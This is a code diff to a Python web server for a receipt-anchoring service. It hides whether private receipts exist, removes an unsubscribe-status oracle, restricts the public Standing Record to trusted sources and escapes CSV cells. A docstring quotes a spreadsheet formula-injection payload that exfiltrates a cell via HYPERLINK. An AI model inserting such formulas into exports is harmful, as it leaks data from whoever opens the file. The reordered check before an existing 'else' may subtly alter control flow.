@@ -1788,10 +1788,12 @@ class Handler(BaseHTTPRequestHandler):
                 lineage_html = ""
                 try:
                     _rec = engine.verify_receipt(rid)
-                    if not _rec.get("found"):
-                        # honest unfurl for dead links: claim nothing
+                    if not _rec.get("found") or _rec.get("private"):
+                        # honest unfurl for dead links: claim nothing. A
+                        # private receipt reads the same, as its page does
+                        # to anyone but the owner, or the unfurl confirms it.
                         sealed = "No record with this id."
-                    elif not _rec.get("private"):
+                    else:
                         _d = str(_rec.get("created_at", ""))[:10]
                         if _d:
                             sealed = f"Sealed {_d}." + _tail
@@ -1831,7 +1833,12 @@ class Handler(BaseHTTPRequestHandler):
                 return
             _cert_missing = False
             try:
-                _cert_missing = not engine.verify_receipt(rid).get("found")
+                # Private renders as missing: the page is public and cached
+                # (max-age=300), so it cannot depend on who is looking, and a
+                # difference here confirmed that a private receipt exists.
+                # The owner's own view is the JS, via /api/verify_folder.
+                _cert_rec = engine.verify_receipt(rid)
+                _cert_missing = not _cert_rec.get("found") or bool(_cert_rec.get("private"))
             except Exception:
                 pass
             try:
@@ -1849,10 +1856,12 @@ class Handler(BaseHTTPRequestHandler):
                 sealed = "A file existed at the recorded moment." + _tail
                 try:
                     _rec = engine.verify_receipt(rid)
-                    if not _rec.get("found"):
-                        # honest unfurl for dead links: claim nothing
+                    if not _rec.get("found") or _rec.get("private"):
+                        # honest unfurl for dead links: claim nothing. A
+                        # private receipt reads the same, as its page does
+                        # to anyone but the owner, or the unfurl confirms it.
                         sealed = "No record with this id."
-                    elif not _rec.get("private"):
+                    else:
                         _d = str(_rec.get("created_at", ""))[:10]
                         if _d:
                             sealed = f"Sealed {_d}." + _tail
@@ -3640,10 +3649,11 @@ class Handler(BaseHTTPRequestHandler):
         try:
             if self._is_head():
                 # A scanner that only looked at the link must not unsubscribe
-                # the recipient. Describe the page GET would serve.
-                added = unsubscribe.would_add(email)
+                # the recipient. Still read the ledger, so HEAD answers 503
+                # exactly when GET would.
+                unsubscribe.would_add(email)
             else:
-                added = unsubscribe.add(email, source="link_get")
+                unsubscribe.add(email, source="link_get")
         except unsubscribe.SuppressionUnavailable:
             # Without this the socket just closed: the visitor could not tell
             # whether the unsubscribe was recorded. It was not. Say so.
@@ -3670,13 +3680,18 @@ class Handler(BaseHTTPRequestHandler):
             "tied to actions you take on the site (receipts, sign-in "
             "links, pack codes) — those are required by the service "
             "itself, not promotional.</p>"
-            f"<p>{'Confirmed.' if added else 'Already on the suppression list — no action needed.'}</p>"
+            # One sentence whether or not the address was already there: the
+            # two used to differ, so a HEAD (which writes nothing) told anyone
+            # holding an address whether its owner had unsubscribed.
+            "<p>Confirmed — this address is on the suppression list.</p>"
             "<p><a href=\"/\">Back to Orphograph</a></p>"
             "</section></main></body></html>"
         ).encode("utf-8")
         self.send_response(200)
         self.send_header("Content-Type", "text/html; charset=utf-8")
         self.send_header("Content-Length", str(len(body)))
+        # The page carries the recipient's address.
+        self.send_header("Cache-Control", "no-store")
         _security_headers(self)
         self.end_headers()
         self.wfile.write(body)
@@ -4656,10 +4671,11 @@ class Handler(BaseHTTPRequestHandler):
         if not record.get("found"):
             _json_response(self, 404, {"receipt_id": rid, "found": False, "error": "receipt not found"})
             return
-        if record.get("kind") != "folder":
-            _json_response(self, 400, {"error": "receipt is not a folder anchor"})
-            return
         is_owner = False
+        # Privacy first: a private receipt answers exactly like a missing one
+        # to anyone but its owner. Checking the kind first answered 400 "not a
+        # folder anchor" for a private single-file receipt, which confirmed it
+        # exists while /api/verify and /api/badge said 404.
         if record.get("private"):
             session_email = self._session_email()
             viewer_id = auth.email_id(session_email) if session_email else None
@@ -4667,6 +4683,9 @@ class Handler(BaseHTTPRequestHandler):
                 _json_response(self, 404, {"receipt_id": rid, "found": False, "error": "receipt not found"})
                 return
             is_owner = True
+        if record.get("kind") != "folder":
+            _json_response(self, 400, {"error": "receipt is not a folder anchor"})
+            return
         else:
             session_email = self._session_email()
             viewer_id = auth.email_id(session_email) if session_email else None
@@ -5588,11 +5607,32 @@ def _count_anchors_for_email(email: str) -> int:
 _WEEKLY_CACHE: dict = {"ts": 0.0, "rows": []}
 
 
+def _is_office_anchor(rec: dict) -> bool:
+    """Whether a receipt may stand on the office's Standing Record.
+
+    The label is the client's text, so it cannot be the test: selecting on
+    `weekly-*` alone let any anonymous caller publish rows on the office's
+    own chain of custody, and 16 of them pushed every real entry off the
+    page. ORPHO_STANDING_RECORD_SOURCES (comma-separated source tags, e.g.
+    the weekly job's `api:<key[:10]>`) pins the record to exactly those.
+    Unpinned, only a paid, identified account's anchor qualifies (api:/sub:),
+    never a free or pack one."""
+    source = rec.get("source")
+    if not isinstance(source, str):
+        return False
+    pins = {t.strip() for t in os.environ.get("ORPHO_STANDING_RECORD_SOURCES", "").split(",")
+            if t.strip()}
+    if pins:
+        return source in pins
+    return source.startswith(("api:", "sub:"))
+
+
 def _list_weekly_anchors(limit: int = 16) -> list[dict]:
     """Latest public weekly self-anchors (client_label weekly-*), 300s cache.
 
     The office re-anchors its own foundations on a schedule
     (scripts/weekly_anchor.py); this powers the public /standing-record page.
+    Only the office's own anchors count: see _is_office_anchor.
     """
     import time as _time
     now = _time.time()
@@ -5613,6 +5653,8 @@ def _list_weekly_anchors(limit: int = 16) -> list[dict]:
                 continue
             label = str(rec.get("client_label") or "")
             if not label.startswith("weekly-") or rec.get("private"):
+                continue
+            if not _is_office_anchor(rec):
                 continue
             rows.append({
                 "receipt_id": rec.get("receipt_id"),
@@ -5739,7 +5781,7 @@ def _anchors_to_csv(anchors: list[dict]) -> str:
         writer.writerow([
             a.get("created_at", ""),
             a.get("receipt_id", ""),
-            a.get("client_label") or "",
+            _csv_text(a.get("client_label") or ""),
             a.get("hash_hex", ""),
             a.get("sha512_hex") or "",
             a.get("calendars_ok", ""),
@@ -5748,6 +5790,18 @@ def _anchors_to_csv(anchors: list[dict]) -> str:
             a.get("btc_pinned_at") or "",
         ])
     return buf.getvalue()
+
+
+def _csv_text(value) -> str:
+    """A free-text cell a spreadsheet will show as text, never evaluate.
+
+    A label is whatever the anchoring client sent (up to 200 chars), and
+    integrations build labels from file names and commit messages. A cell
+    that starts with = + - @ or a tab/CR is a formula in Excel and Sheets,
+    e.g. =HYPERLINK("http://…/?"&A2) exfiltrates a neighbouring cell when the
+    owner opens the export. A leading apostrophe makes it literal text."""
+    text = str(value)
+    return "'" + text if text[:1] in ("=", "+", "-", "@", "\t", "\r") else text
 
 
 def _seed_sample_receipt() -> None:
